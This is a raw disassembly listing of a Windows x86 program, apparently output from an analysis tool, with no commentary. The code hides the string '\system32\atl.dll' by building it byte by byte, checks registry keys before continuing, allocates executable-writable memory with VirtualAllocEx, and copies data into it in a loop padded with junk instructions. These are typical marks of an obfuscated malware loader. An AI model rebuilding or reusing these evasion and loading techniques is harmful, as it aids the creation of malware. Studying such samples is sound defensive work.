0x00401000:	pushl	%ebp	; from: 0x0040153b(MAY), 0x00401464(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	movl	0x8(%ebp), %eax
0x00401006:	movl	-4(%eax), %eax
0x00401009:	popl	%ebp
0x0040100a:	ret	; targets: 0x00401540(MAY), 0x00401469(MAY)

0x004010c0:	pushl	%ebp	; from: 0x0040152f(MAY), 0x00401458(MAY)
0x004010c1:	movl	%esp, %ebp
0x004010c3:	movl	0x00445014, %eax
0x004010c8:	movb	$0x73, 0x3(%eax)
0x004010cc:	movl	0x00445014, %ecx
0x004010d2:	movb	$0x74, 0x4(%ecx)
0x004010d6:	movl	0x00445014, %edx
0x004010dc:	movb	$0x65, 0x5(%edx)
0x004010e0:	movl	0x00445014, %eax
0x004010e5:	movb	$0x6d, 0x6(%eax)
0x004010e9:	movl	0x00445014, %ecx
0x004010ef:	movb	$0x33, 0x7(%ecx)
0x004010f3:	movl	0x00445014, %edx
0x004010f9:	movb	$0x32, 0x8(%edx)
0x004010fd:	movl	0x00445014, %eax
0x00401102:	movb	$0x5c, 0x9(%eax)
0x00401106:	movl	0x00445014, %ecx
0x0040110c:	movb	$0x61, 0xa(%ecx)
0x00401110:	movl	0x00445014, %edx
0x00401116:	movb	$0x74, 0xb(%edx)
0x0040111a:	movl	0x00445014, %eax
0x0040111f:	movb	$0x6c, 0xc(%eax)
0x00401123:	movl	0x00445014, %ecx
0x00401129:	movb	$0x2e, 0xd(%ecx)
0x0040112d:	movl	0x00445014, %edx
0x00401133:	movb	$0x64, 0xe(%edx)
0x00401137:	movl	0x00445014, %eax
0x0040113c:	movb	$0x6c, 0xf(%eax)
0x00401140:	movl	0x00445014, %ecx
0x00401146:	movb	$0x6c, 0x10(%ecx)
0x0040114a:	movl	0x00445014, %edx
0x00401150:	movb	$0x5c, (%edx)
0x00401153:	movl	0x00445014, %eax
0x00401158:	movb	$0x73, 0x1(%eax)
0x0040115c:	movl	0x00445014, %ecx
0x00401162:	movb	$0x79, 0x2(%ecx)
0x00401166:	popl	%ebp
0x00401167:	ret	; targets: 0x00401534(MAY), 0x0040145d(MAY)

0x00401170:	pushl	%ebp	; from: 0x004014fd(MAY)
0x00401171:	movl	%esp, %ebp
0x00401173:	popl	%ebp
0x00401174:	ret	; targets: 0x00401502(MAY)

0x004011f0:	pushl	%ebp	; from: 0x004014df(MAY)
0x004011f1:	movl	%esp, %ebp
0x004011f3:	pushl	%ecx
0x004011f4:	movl	$0x4, -4(%ebp)
0x004011fb:	pushl	$0x40
0x004011fd:	pushl	$0x3000
0x00401202:	movl	0x8(%ebp), %eax
0x00401205:	pushl	%eax
0x00401206:	pushl	$0x0
0x00401208:	pushl	$0xffffffff
0x0040120a:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff001030(MAY)
0x00401210:	movl	%ebp, %esp
0x00401212:	popl	%ebp
0x00401213:	ret	; targets: 0x004014e4(MAY)

0x00401220:	pushl	%ebp	; from: 0x004015d0(MAY)
0x00401221:	movl	%esp, %ebp
0x00401223:	subl	$0x8, %esp
0x00401226:	movl	0x8(%ebp), %eax
0x00401229:	movl	%eax, -4(%ebp)
0x0040122c:	movl	0xc(%ebp), %ecx
0x0040122f:	movl	%ecx, -8(%ebp)
0x00401232:	movl	-4(%ebp), %edx
0x00401235:	cmpl	-8(%ebp), %edx
0x00401238:	jae	0x00401241	; targets: 0x0040123a(MAY)
0x0040123a:	movl	-4(%ebp), %eax	; from: 0x00401238(MAY)
0x0040123d:	jmp	0x00401244	; targets: 0x00401244(MAY)
0x00401244:	movl	%ebp, %esp	; from: 0x0040123d(MAY)
0x00401246:	popl	%ebp
0x00401247:	ret	; targets: 0x004015d5(MAY)

0x004012e0:	pushl	%ebp	; from: 0x004015ff(MAY)
0x004012e1:	movl	%esp, %ebp
0x004012e3:	subl	$0xc, %esp
0x004012e6:	movl	$0x3, -4(%ebp)
0x004012ed:	movl	$0x89ed3, -4(%ebp)
0x004012f4:	movl	$0x0, -12(%ebp)
0x004012fb:	jmp	0x00401306	; targets: 0x00401306(MAY)
0x004012fd:	movl	-12(%ebp), %eax	; from: 0x0040133a(MAY)
0x00401300:	addl	$0x1, %eax
0x00401303:	movl	%eax, -12(%ebp)
0x00401306:	movl	-12(%ebp), %ecx	; from: 0x004012fb(MAY)
0x00401309:	cmpl	0x10(%ebp), %ecx
0x0040130c:	jnl	0x0040133c	; targets: 0x0040133c(MAY), 0x0040130e(MAY)
0x0040130e:	movl	$0x89ed3, -4(%ebp)	; from: 0x0040130c(MAY)
0x00401315:	movl	0xc(%ebp), %edx
0x00401318:	addl	-12(%ebp), %edx
0x0040131b:	movzbl	(%edx), %eax
0x0040131e:	movl	%eax, -8(%ebp)
0x00401321:	movl	$0x89ed3, -4(%ebp)
0x00401328:	movl	0x8(%ebp), %ecx
0x0040132b:	addl	-12(%ebp), %ecx
0x0040132e:	movb	-8(%ebp), %dl
0x00401331:	movb	%dl, (%ecx)
0x00401333:	movl	$0x89ed3, -4(%ebp)
0x0040133a:	jmp	0x004012fd	; targets: 0x004012fd(MAY)
0x0040133c:	movl	%ebp, %esp	; from: 0x0040130c(MAY)
0x0040133e:	popl	%ebp
0x0040133f:	ret	; targets: unresolved


start:
0x00401340:	pushl	%ebp
0x00401341:	movl	%esp, %ebp
0x00401343:	subl	$0x178, %esp
0x00401349:	pusha	
0x0040134a:	movl	%ebp, 0x00446fac
0x00401350:	movl	$0x0, -328(%ebp)
0x0040135a:	leal	-296(%ebp), %eax
0x00401360:	pushl	%eax
0x00401361:	pushl	$0x20019
0x00401366:	pushl	$0x0
0x00401368:	pushl	$0x44506c
0x0040136d:	pushl	$0x80000002
0x00401372:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000530(MAY)
0x00401378:	testl	%eax, %eax
0x0040137a:	je	0x0040138b	; targets: 0x0040138b(MAY), 0x0040137c(MAY)
0x0040137c:	pushl	$0x4	; from: 0x0040137a(MAY)
0x0040137e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff001040(MAY)
0x00401384:	xorl	%eax, %eax
0x00401386:	jmp	0x00401812	; targets: 0x00401812(MAY)
0x0040138b:	leal	-296(%ebp), %ecx	; from: 0x0040137a(MAY)
0x00401391:	pushl	%ecx
0x00401392:	pushl	$0x20019
0x00401397:	pushl	$0x0
0x00401399:	pushl	$0x445080
0x0040139e:	movl	-296(%ebp), %edx
0x004013a4:	pushl	%edx
0x004013a5:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000530(MAY)
0x004013ab:	testl	%eax, %eax
0x004013ad:	je	0x004013c3	; targets: 0x004013c3(MAY), 0x004013af(MAY)
0x004013af:	pushl	$0x4	; from: 0x004013ad(MAY)
0x004013b1:	call	LoadLibraryW@kernel32.dll	; targets: 0xff001040(MAY)
0x004013b7:	xorl	%eax, %eax
0x004013b9:	jmp	0x00401812	; targets: 0x00401812(MAY)
0x004013c3:	movl	CreateFileA@kernel32.dll, %eax	; from: 0x004013ad(MAY)
0x004013c8:	movl	%eax, -348(%ebp)
0x004013ce:	movl	$0x404204, -312(%ebp)
0x004013d8:	movl	$0x0, -296(%ebp)
0x004013e2:	movl	$0x0, -276(%ebp)
0x004013ec:	movl	$0x64, -320(%ebp)
0x004013f6:	movl	$0x2, -284(%ebp)
0x00401400:	movl	$0x0, -328(%ebp)
0x0040140a:	movl	$0x0, -292(%ebp)
0x00401414:	movl	$0x1, -316(%ebp)
0x0040141e:	movl	$0x0, -328(%ebp)
0x00401428:	movl	$0x0, -292(%ebp)
0x00401432:	movl	$0x1, -316(%ebp)
0x0040143c:	movl	$0x3, -280(%ebp)
0x00401446:	pushl	$0x104
0x0040144b:	leal	-272(%ebp), %ecx
0x00401451:	pushl	%ecx
0x00401452:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff001080(MAY)
0x00401458:	call	0x004010c0	; targets: 0x004010c0(MAY)
0x0040145d:	movl	-312(%ebp), %edx	; from: 0x00401167(MAY)
0x00401463:	pushl	%edx
0x00401464:	call	0x00401000	; targets: 0x00401000(MAY)
0x00401469:	addl	$0x4, %esp	; from: 0x0040100a(MAY)
0x0040146c:	movl	%eax, -332(%ebp)
0x00401472:	movl	0x00445014, %eax
0x00401477:	pushl	%eax
0x00401478:	leal	-272(%ebp), %ecx
0x0040147e:	pushl	%ecx
0x0040147f:	call	lstrlenA@kernel32.dll	; targets: 0xff0010a0(MAY)
0x00401485:	leal	-272(%ebp,%eax), %edx
0x0040148c:	pushl	%edx
0x0040148d:	call	lstrcpyA@kernel32.dll	; targets: 0xff0010c0(MAY)
0x00401493:	pushl	$0x0
0x00401495:	pushl	$0x80
0x0040149a:	pushl	$0x3
0x0040149c:	pushl	$0x0
0x0040149e:	movl	-280(%ebp), %eax
0x004014a4:	pushl	%eax
0x004014a5:	movl	-316(%ebp), %ecx
0x004014ab:	pushl	%ecx
0x004014ac:	leal	-272(%ebp), %edx
0x004014b2:	pushl	%edx
0x004014b3:	call	-348(%ebp)	; targets: 0xff001060(MAY)
0x004014b9:	movl	%eax, -300(%ebp)
0x004014bf:	cmpl	$0xffffffff, -300(%ebp)
0x004014c6:	je	0x004014d1	; targets: 0x004014d1(MAY), 0x004014c8(MAY)
0x004014c8:	cmpl	$0x0, -300(%ebp)	; from: 0x004014c6(MAY)
0x004014cf:	jne	0x004014d8	; targets: 0x004014d8(MAY), 0x004014d1(MAY)
0x004014d1:	xorl	%eax, %eax	; from: 0x004014c6(MAY), 0x004014cf(MAY)
0x004014d3:	jmp	0x00401812	; targets: 0x00401812(MAY)
0x004014d8:	movl	-332(%ebp), %eax	; from: 0x004014cf(MAY)
0x004014de:	pushl	%eax
0x004014df:	call	0x004011f0	; targets: 0x004011f0(MAY)
0x004014e4:	addl	$0x4, %esp	; from: 0x00401213(MAY)
0x004014e7:	movl	%eax, -324(%ebp)
0x004014ed:	movl	-332(%ebp), %ecx
0x004014f3:	pushl	%ecx
0x004014f4:	pushl	$0x0
0x004014f6:	movl	-324(%ebp), %edx
0x004014fc:	pushl	%edx
0x004014fd:	call	0x00401170	; targets: 0x00401170(MAY)
0x00401502:	addl	$0xc, %esp	; from: 0x00401174(MAY)
0x00401505:	movl	-332(%ebp), %eax
0x0040150b:	movl	%eax, -340(%ebp)
0x00401511:	movl	CreateFileA@kernel32.dll, %ecx
0x00401517:	movl	%ecx, -352(%ebp)
0x0040151d:	pushl	$0x104
0x00401522:	leal	-272(%ebp), %edx
0x00401528:	pushl	%edx
0x00401529:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff001080(MAY)
0x0040152f:	call	0x004010c0	; targets: 0x004010c0(MAY)
0x00401534:	movl	-312(%ebp), %eax	; from: 0x00401167(MAY)
0x0040153a:	pushl	%eax
0x0040153b:	call	0x00401000	; targets: 0x00401000(MAY)
0x00401540:	addl	$0x4, %esp	; from: 0x0040100a(MAY)
0x00401543:	movl	%eax, -332(%ebp)
0x00401549:	movl	0x00445014, %ecx
0x0040154f:	pushl	%ecx
0x00401550:	leal	-272(%ebp), %edx
0x00401556:	pushl	%edx
0x00401557:	call	lstrlenA@kernel32.dll	; targets: 0xff0010a0(MAY)
0x0040155d:	leal	-272(%ebp,%eax), %eax
0x00401564:	pushl	%eax
0x00401565:	call	lstrcpyA@kernel32.dll	; targets: 0xff0010c0(MAY)
0x0040156b:	pushl	$0x0
0x0040156d:	pushl	$0x80
0x00401572:	pushl	$0x3
0x00401574:	pushl	$0x0
0x00401576:	movl	-280(%ebp), %ecx
0x0040157c:	pushl	%ecx
0x0040157d:	movl	-316(%ebp), %edx
0x00401583:	pushl	%edx
0x00401584:	leal	-272(%ebp), %eax
0x0040158a:	pushl	%eax
0x0040158b:	call	-352(%ebp)	; targets: 0xff001060(MAY)
0x00401591:	movl	%eax, -300(%ebp)
0x00401597:	cmpl	$0xffffffff, -300(%ebp)
0x0040159e:	je	0x004015a9	; targets: 0x004015a0(MAY), 0x004015a9(MAY)
0x004015a0:	cmpl	$0x0, -300(%ebp)	; from: 0x0040159e(MAY)
0x004015a7:	jne	0x004015b0	; targets: 0x004015b0(MAY), 0x004015a9(MAY)
0x004015a9:	xorl	%eax, %eax	; from: 0x0040159e(MAY), 0x004015a7(MAY)
0x004015ab:	jmp	0x00401812	; targets: 0x00401812(MAY)
0x004015b0:	movl	-328(%ebp), %ecx	; from: 0x004015a7(MAY)
0x004015b6:	cmpl	-332(%ebp), %ecx
0x004015bc:	jae	0x00401648	; targets: 0x004015c2(MAY)
0x004015c2:	movl	-340(%ebp), %edx	; from: 0x004015bc(MAY)
0x004015c8:	pushl	%edx
0x004015c9:	movl	-320(%ebp), %eax
0x004015cf:	pushl	%eax
0x004015d0:	call	0x00401220	; targets: 0x00401220(MAY)
0x004015d5:	addl	$0x8, %esp	; from: 0x00401247(MAY)
0x004015d8:	movl	%eax, -344(%ebp)
0x004015de:	movl	-344(%ebp), %ecx
0x004015e4:	pushl	%ecx
0x004015e5:	movl	-312(%ebp), %edx
0x004015eb:	addl	-292(%ebp), %edx
0x004015f1:	pushl	%edx
0x004015f2:	movl	-324(%ebp), %eax
0x004015f8:	addl	-328(%ebp), %eax
0x004015fe:	pushl	%eax
0x004015ff:	call	0x004012e0	; targets: 0x004012e0(MAY)
0x00401812:	movl	%ebp, %esp	; from: 0x004013b9(MAY), 0x00401386(MAY), 0x004015ab(MAY), 0x004014d3(MAY)
0x00401814:	popl	%ebp
0x00401815:	ret	; targets: 0xfee70000(MAY)

